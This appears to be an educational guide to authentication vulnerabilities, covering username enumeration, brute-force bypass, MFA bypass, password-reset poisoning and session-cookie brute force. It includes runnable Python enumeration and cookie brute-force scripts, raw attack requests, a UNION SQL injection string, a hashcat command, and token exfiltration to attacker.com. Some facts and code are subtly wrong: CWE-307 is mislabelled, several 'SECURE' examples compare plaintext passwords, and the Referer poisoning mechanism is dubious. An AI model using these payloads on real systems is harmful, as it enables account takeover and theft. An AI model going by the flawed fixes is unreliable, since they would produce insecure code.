# Deep-Dive Architectural Study: Authentication Vulnerabilities

**Category**: Identity Verification & Access Control Flaws  
**Severity**: Critical (Account Takeover, Data Breach, Full System Control)  
**CWE Mapping**: CWE-287 (Primary), CWE-384, CWE-613, CWE-798  
**OWASP Top 10**: A07:2021 (Identification and Authentication Failures)

---

## 1. Username Enumeration Vulnerabilities

### Module 01: Enumeration via Different Response Messages
*   **CWE Mapping**: CWE-200 (Information Disclosure)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on the application returning different error messages for invalid usernames versus invalid passwords. This creates a reliable boolean indicator for username existence without requiring any authentication.

During login attempts:
1. Application checks if username exists in database
2. If username NOT found → returns "Invalid username or password"
3. If username EXISTS but password wrong → returns "Invalid password"
4. Attacker can distinguish between the two messages

The attacker exploits this by:
- Submitting login requests with different usernames
- Comparing response messages
- Building a list of valid usernames

#### Raw Injection Payload (Testing Username Existence)
```text
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "Carlos123",
  "password": "wrongpassword"
}
```

#### 📄 Demo Server Response for VALID Username
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{
  "error": "Invalid password"
}
```
*   **Result**: "Invalid password" indicates Carlos123 EXISTS ✓

#### 📄 Demo Server Response for INVALID Username
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{
  "error": "Invalid username or password"
}
```
*   **Result**: Generic message indicates username DOES NOT EXIST ✗

#### Attacker Enumeration Script
```python
import requests

valid_usernames = []

for username in username_candidates:
    response = requests.post(
        'https://vulnerable-app.com/login',
        json={'username': username, 'password': 'wrong'}
    )
    
    if 'Invalid password' in response.text:
        valid_usernames.append(username)
        print(f"[+] {username} EXISTS ✓")

print(f"\nFound {len(valid_usernames)} valid usernames: {valid_usernames}")
```

#### Backend Should Return (Secure Implementation)
```python
# ✅ SECURE (Same Message for Both)
def login(username, password):
    user = db.get_user(username)
    
    # Same error regardless of whether user exists
    if not user or user.password != password:
        return Error("Invalid username or password")  # ← ALWAYS SAME
    
    return create_session(user)
```

---

### Module 02: Enumeration via Response Timing
*   **CWE Mapping**: CWE-200 (Information Disclosure)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on time-based differences in password hashing/comparison. When a username exists, the application performs password hashing (slow: 100ms). When username doesn't exist, it returns immediately (fast: 10ms).

The attacker exploits this by:
- Measuring response times for different usernames
- Identifying slow responses as existing usernames
- Automating enumeration with timing thresholds

#### 🎯 Raw Timing Measurement Request
```text
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "Carlos123",
  "password": "wrong"
}
```

#### 📄 Demo Server Response Timing for VALID Username
Request: POST /login (username=Carlos123)
Response Time: 110ms ← SLOW (found user + hashed password)

#### 📄 Demo Server Response Timing for INVALID Username
Request: POST /login (username=Invalid999)
Response Time: 10ms ← FAST (user not found, no hash)

#### Attacker Timing-Based Enumeration Script
```python
import time
import requests

valid_usernames = []

for username in username_candidates:
    start = time.time()
    response = requests.post(
        'https://vulnerable-app.com/login',
        json={'username': username, 'password': 'wrong'}
    )
    elapsed = (time.time() - start) * 1000  # Convert to ms
    
    if elapsed > 50:  # Slow = user exists
        valid_usernames.append(username)
        print(f"[+] {username} EXISTS ✓ ({elapsed}ms)")
    else:
        print(f"[ ] {username} NOT FOUND ({elapsed}ms)")

print(f"\nFound {len(valid_usernames)} valid usernames")
```

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Constant Time Response)
def login_secure(username, password):
    user = db.get_user(username)
    
    # Always perform password hash (even if user not found)
    password_hash = hash(password)
    
    # Add delay to match password check time
    if not user or password_hash != user.password_hash:
        time.sleep(0.1)  # ← Match hash time
        return Error("Invalid username or password")
    
    return create_session(user)
```

---

### Module 03: Enumeration via Account Lock Behavior
*   **CWE Mapping**: CWE-200 (Information Disclosure)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on account lockout triggering only for existing usernames. When an attacker submits N failed attempts:
- Existing username → account locks after N attempts
- Non-existing username → no lockout triggered

The attacker exploits this by:
- Sending N failed login attempts for each username
- Testing if account is locked
- Enumerating usernames via lock behavior

#### 🎯 Raw Enumeration Attack (5 Failed Attempts)
```text
for i in range(5):
  POST /login HTTP/1.1
  Host: vulnerable-app.com
  Content-Type: application/json
  
  {
    "username": "Carlos123",
    "password": "wrong{i}"
  }
```

#### 📄 Demo Server Response for VALID Username (After 5 Attempts)
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{
  "error": "Account locked - try again in 15 minutes"
}
```
*   **Result**: Account lock indicates Carlos123 EXISTS ✓

#### 📄 Demo Server Response for INVALID Username (After 5 Attempts)
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{
  "error": "Invalid username or password"
}
```
*   **Result**: No lock indicates username DOES NOT EXIST ✗

---

## 🔬 2. Brute-Force Protection Vulnerabilities

### Module 04: Broken Brute-Force Protection (IP Block)
*   **CWE Mapping**: CWE-307 (Improper Error Handling)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on rate limiting implemented per-IP address instead of per-username. When an attacker rotates IP addresses (via X-Forwarded-For header or proxy rotation), each request appears from a new IP, bypassing the rate limit.

The attacker exploits this by:
- Sending brute force attempts with rotated IPs
- Bypassing IP-based rate limiting
- Testing 1000+ passwords against single username

#### 🎯 Raw Brute Force with IP Rotation
```text
for i in range(1000):
  POST /login HTTP/1.1
  Host: vulnerable-app.com
  Headers:
    X-Forwarded-For: {random_ip}
  
  {
    "username": "Carlos123",
    "password": pass_list[i]
  }
```

#### 📄 Demo Server Response (No Rate Limit Triggered)
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{
  "error": "Invalid password"
}
```
*   **Result**: Each request appears from different IP, no rate limit ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Per-Username Rate Limit)
def login_secure(username, password, request):
    # Track failed attempts per username (not IP)
    if rate_limit_exceeded(username):
        return Error("Too many attempts")
    
    user = db.get_user(username)
    if user and user.password == password:
        return create_session(user)
    
    increment_rate_limit(username)  # ← Tracks username
    return Error("Invalid credentials")
```

---

### Module 05: Broken Brute-Force Protection (Multiple Credentials)
*   **CWE Mapping**: CWE-307 (Improper Error Handling)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on login endpoint accepting multiple username/password pairs in a single request. This allows bulk brute force without triggering per-request rate limits.

The attacker exploits this by:
- Sending 100 credentials in 1 request
- Checking which credentials are valid
- Bypassing per-request rate limiting

#### 🎯 Raw Bulk Credentials Request
```json
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "credentials": [
    {"username": "user1", "password": "pass1"},
    {"username": "user2", "password": "pass2"},
    ...  // 100 pairs
  ]
}
```

#### 📄 Demo Server Response (Valid Credentials Found)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "valid_credentials": [
    {"username": "user47", "password": "pass47"}
  ]
}
```
*   **Result**: One request tested 100 credentials, bypassed rate limit ✓

---

## 🔬 3. Multi-Factor Authentication (MFA) Vulnerabilities

### Module 06: 2FA Simple Bypass (Forced Browsing)
*   **CWE Mapping**: CWE-287 (Improper Authentication)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on MFA enforcement not being checked on protected endpoints. After login, application sets `session['enforce_mfa'] = True` but never verifies this flag before granting access to sensitive pages.

The attacker exploits this by:
- Completing login (username/password)
- Skipping MFA page via forced browsing
- Accessing dashboard directly

#### 🎯 Raw Forced Browsing Attack
```text
# Step 1: Complete login (no MFA yet)
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "Attacker",
  "password": "correct"
}

# Response sets:
# session['userid'] = Attacker
# session['enforce_mfa'] = True

# Step 2: FORCED BROWSING - skip MFA page
GET /dashboard HTTP/1.1
Host: vulnerable-app.com

# Response:
# - Check: session['userid'] exists? → YES ✓
# - Check: session['enforce_mfa']? → NOT CHECKED ✗
# - Result: Dashboard granted ✓
```

#### 📄 Demo Server Response (MFA Bypassed)
```http
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Welcome to Dashboard!</h1>
<!-- MFA completely bypassed via forced browsing -->
```

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (MFA Enforced on Every Endpoint)
def login_secure(username, password):
    user = db.get_user(username)
    
    if user.password != password:
        return Error("Invalid credentials")
    
    session.update({
        'userid': user.id,
        'mfa_verified': False  # ← Default NOT verified
    })
    
    if user.mfa_enabled:
        return redirect('/mfa-entry')
    
    session['mfa_verified'] = True
    return redirect('/dashboard')

def dashboard_secure():
    if not session['userid']:
        return Error("Not logged in")
    
    user = db.get_user(session['userid'])
    if user.mfa_enabled and not session['mfa_verified']:
        return redirect('/mfa-entry')  # ← CHECK MFA
    
    return render_dashboard()
```

---

### Module 07: 2FA Broken Logic (MFA Code for Different User)
*   **CWE Mapping**: CWE-287 (Improper Authentication)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on MFA verification not binding the code to the original user who initiated login. Attacker can complete login for User A, then submit MFA code for User B, and the system accepts it.

The attacker exploits this by:
- Logging in with their own account (Attacker)
- Intercepting MFA code sent to victim (Carlos)
- Submitting Carlos's code while logged in as Attacker
- System accepts code without verifying user match

#### 🎯 Raw MFA Code Reuse Attack
```text
# Step 1: Attacker logs in with their account
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "Attacker",
  "password": "attacker_password"
}

# Response:
# session['userid'] = Attacker
# session['mfa_pending'] = True

# Step 2: Attacker submits Carlos's MFA code
POST /mfa-verify HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "code": "123456",  # ← Carlos's code (intercepted)
  "username": "Carlos"  # ← Different user!
}

# Response:
# - Check: code matches Carlos's code? → YES ✓
# - session['mfa_verified'] = True  # ← FOR Attacker!
# - Result: Attacker has MFA-verified access ✓
```

#### 📄 Demo Server Response (MFA Bypassed)
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "mfa_verified": true,
  "message": "MFA code verified"
}
```
*   **Result**: MFA code accepted for different user, account compromised ✓

---

## 🔬 4. Password Reset Vulnerabilities

### Module 08: Password Reset Poisoning via Referer
*   **CWE Mapping**: CWE-601 (Open Redirect), CWE-20 (Improper Input Validation)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on password reset link including the Referer header in the URL. When victim clicks the poisoned link, the token is sent to the attacker's server via redirect.

The attack flow:
1. Attacker sends password reset for victim's email
2. Includes malicious Referer header (attacker.com)
3. Server generates reset link with Referer
4. Victim clicks link → redirected to attacker.com with token
5. Attacker captures token, resets password

#### 🎯 Raw Poisoning Request
```text
POST /password-reset HTTP/1.1
Host: vulnerable-app.com
Headers:
  Referer: https://attacker.com/capture

{
  "email": "victim@email.com"
}
```

#### 📄 Demo Server Response (Poisoned Reset Link)
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Reset link sent to email",
  "reset_link": "https://vulnerable-app.com/reset?token=abc123&referer=https://attacker.com/capture"
}
```
*   **Result**: Reset link contains attacker's Referer, token will be exfiltrated ✓

#### Email Sent to Victim (Poisoned Link)
Subject: Password Reset Request

Click here to reset your password:
https://vulnerable-app.com/reset?token=abc123&referer=https://attacker.com/capture

#### Victim Clicks Link → Token Exfiltrated
```text
GET /reset?token=abc123&referer=https://attacker.com/capture
Host: vulnerable-app.com

→ Redirects to: https://attacker.com/capture?token=abc123
→ Token sent to attacker!
```

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Fixed URL, No External Headers)
def send_reset_link_secure(email, request):
    token = generate_token()
    db.store_reset_token(email, token)
    
    # Fixed URL, no external headers
    reset_url = f"https://vulnerable-app.com/reset?token={token}"
    
    send_email(email, f"Click here: {reset_url}")
```

---

### Module 09: Password Reset Poisoning via Middleware (X-Forwarded-Host)
*   **CWE Mapping**: CWE-601 (Open Redirect), CWE-20 (Improper Input Validation)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on middleware using X-Forwarded-Host header to construct reset URL. Attacker manipulates this header to redirect to attacker domain.

#### 🎯 Raw Poisoning Request
```text
POST /password-reset HTTP/1.1
Host: vulnerable-app.com
Headers:
  X-Forwarded-Host: attacker.com

{
  "email": "victim@email.com"
}
```

#### 📄 Demo Server Response (Poisoned Link with Attacker Host)
```http
HTTP/1.1 200 OK

{
  "reset_link": "https://attacker.com/reset?token=abc123"
}
```
*   **Result**: Reset link redirected to attacker.com, token exfiltrated ✓

---

### Module 10: Password Reset Broken Logic
*   **CWE Mapping**: CWE-287 (Improper Authentication)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on password reset endpoint not validating token ownership. Attacker can use any valid token to reset any user's password.

#### 🎯 Raw Token Abuse
```text
POST /reset-password HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "token": "abc123",  # ← Any valid token
  "password": "newpassword",
  "username": "Carlos"  # ← Reset Carlos's password
}
```

#### 📄 Demo Server Response (Password Reset for Different User)
```http
HTTP/1.1 200 OK

{
  "success": true,
  "message": "Password updated for Carlos"
}
```
*   **Result**: Attacker reset Carlos's password with stolen token ✓

---

## 🔬 5. Session Management Vulnerabilities

### Module 11: Brute-Forcing Stay-Logged-In Cookie
*   **CWE Mapping**: CWE-330 (Insufficient Entropy)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on session cookie having low entropy (sequential numbers, short strings). Attacker can brute force valid session cookies.

#### 🎯 Raw Cookie Brute Force
```python
import requests

for cookie_value in range(1, 100000):
    response = requests.get(
        'https://vulnerable-app.com/dashboard',
        cookies={'stay_logged_in': cookie_value}
    )
    
    if response.status_code == 200:
        print(f"[+] Valid cookie: {cookie_value}")
        # Session hijacked!
```

#### 📄 Demo Server Response (Valid Cookie Found)
```http
HTTP/1.1 200 OK
Content-Type: text/html

<h1>Welcome to Dashboard!</h1>
```
*   **Result**: Session hijacked via brute-forced cookie ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (High Entropy Cookie)
def create_session_secure(user):
    cookie_value = secrets.token_urlsafe(32)  # ← 256 bits entropy
    db.store_session(user.id, cookie_value)
    return cookie_value
```

---

### Module 12: Offline Password Cracking
*   **CWE Mapping**: CWE-798 (Use of Hard-coded Password), CWE-327 (Weak Hash)
*   **OWASP Top 10 Reference**: A07:2021-Identification and Authentication Failures

#### Low-Level Architectural Mechanics
The vulnerability relies on weak password hashing (MD5, SHA1) exposed via SQL injection or file upload. Attacker extracts hash and cracks offline without rate limiting.

#### 🎯 Raw Hash Extraction (SQL Injection)
```text
GET /user?id=1 UNION SELECT password_hash FROM users WHERE id=1
Host: vulnerable-app.com

Response:
{
  "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99"  // MD5 of "password"
}
```

#### 🎯 Offline Cracking (Hashcat)
```bash
# Crack MD5 hash with hashcat
hashcat -m 0 hashes.txt password_list.txt

# Result:
# 5f4dcc3b5aa765d61d8327deb882cf99:password
```

#### 📄 Login with Cracked Password
```text
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "username": "Carlos123",
  "password": "password"  // ← Cracked offline
}

Response:
HTTP/1.1 200 OK
{
  "success": true
}
```
*   **Result**: Password cracked without rate limiting, account taken over ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Strong Hash, No Exposure)
def store_password_secure(password):
    return bcrypt.hashpw(password, bcrypt.gensalt())  # ← Bcrypt (slow, secure)

# Hash never exposed in API
GET /user?id=1
Response:
{
  "username": "Carlos123"
  # No password hash returned
}
```

---

## 🔧 Detection & Exploitation Methodology

### Step 1: Username Enumeration
**Techniques**:
1. **Different response messages**: Compare error messages
2. **Response timing**: Measure milliseconds
3. **Response length**: Compare body length
4. **Account lock**: Test lock behavior

**Tools**: Burp Intruder, Python scripts, Burp Repeater

### Step 2: Brute Force Testing
**Questions**:
- Is rate limiting per-IP or per-username?
- Does CAPTCHA trigger?
- Can I bypass via IP rotation?

**Techniques**: Rotate IPs, bulk credentials, password change endpoint

### Step 3: MFA Testing
**Techniques**:
1. **Forced browsing**: Skip MFA page
2. **Code reuse**: Test for different user
3. **Skip verification**: Test if optional

### Step 4: Password Reset Testing
**Techniques**:
1. **Poisoning**: Manipulate Referer/Host
2. **Token reuse**: Test old tokens
3. **User mismatch**: Reset for different user

---

## 🛡️ Prevention Strategies

### Secure Password-Based Login
1. **Rate limiting per-username** (not per-IP)
2. **Strong password hashing** (bcrypt, Argon2)
3. **Same error message** for invalid username AND password
4. **CAPTCHA** after N attempts
5. **Account lockout** with timeout
6. **Alert user** after N lockouts

### Secure MFA Implementation
1. **Verify MFA on EVERY endpoint**
2. **Bind MFA code to user** (no reuse)
3. **One-time codes** (no reuse)
4. **Timeout codes** (5 minutes)
5. **Check MFA status** before protected pages

### Secure Password Reset
1. **Fixed reset URL** (no external headers)
2. **One-time tokens** (invalidate after use)
3. **Short expiry** (15-30 minutes)
4. **Email confirmation** before change
5. **No hash exposure**

### Secure Session Management
1. **Cookie security flags**: `Secure`, `HttpOnly`, `SameSite=Strict`
2. **Idle timeout**: 15–30 minutes (high-value sessions: 2–5 minutes)
3. **Absolute timeout**: Maximum 4–8 hours
4. **Server-side validation**: Enforce session timeouts on the server, not the client
5. **Session ID rotation**: Regenerate session ID after login and privilege changes
6. **Full logout**: Invalidate the server session and clear the client cookie
7. **Cache control**: Use `Cache-Control: no-store` for sensitive responses
8. **Session fingerprinting**: Track IP address, User-Agent, and detect suspicious changes
9. **No client-side token storage**: Never store session tokens in `localStorage` (XSS risk)
10. **High-entropy session IDs**: Use cryptographically secure 256-bit random session identifiers

### Critical Authentication Concepts
1. **Username enumeration**: Different error messages or responses reveal valid usernames
2. **Timing attacks**: Authentication response time differs when a username exists due to password hash verification
3. **IP-based rate limiting bypass**: Circumvent rate limits by rotating IPs or spoofing `X-Forwarded-For` (if trusted incorrectly)
4. **MFA bypass**: Exploit forced browsing, insecure workflows, or reuse verification codes across accounts
5. **Password reset poisoning**: Manipulate `Host`, `Referer`, or `X-Forwarded-Host` headers to alter password reset links
6. **Mass assignment**: Automatic parameter binding exposes hidden authentication or privilege fields
7. **Session entropy**: Low-entropy session IDs can be brute-forced or predicted
8. **Weak password hashing**: Using `MD5` or `SHA-1` enables efficient offline password cracking
```
### 📚 References & Whitepapers
1. **OWASP Top 10 (2021)**: A07:2021 – Identification and Authentication Failures
2. **OWASP Authentication Cheat Sheet**: Best practices for secure authentication implementation
3. **OWASP Session Management Cheat Sheet**: Secure session handling and lifecycle management
4. **OWASP Password Storage Cheat Sheet**: Recommendations for password hashing and storage
5. **PortSwigger Web Security Academy**: Authentication Vulnerabilities learning path
6. **Burp Suite Param Miner**: BApp for discovering hidden parameters and attack surface
7. **NIST SP 800-63B**: Digital Identity Guidelines – Authentication and Authenticator Management
```
